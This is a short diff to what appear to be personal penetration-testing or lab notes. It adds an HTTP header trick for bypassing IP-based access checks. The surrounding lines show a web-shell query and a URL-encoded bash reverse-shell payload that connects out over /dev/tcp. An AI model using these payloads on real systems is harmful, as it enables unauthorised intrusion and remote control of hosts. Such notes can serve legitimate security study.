@@ -194,5 +194,8 @@ run the exploit: python exploit.y http://$IP
 access it + ?cmd=id, reverse shell
 0=/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/IP/80+0%3E%261%27
 
+Adding this header to attempt Http Web Tampering:
+X-Custom-IP-Authorization: 127.0.0.1
+
 
 
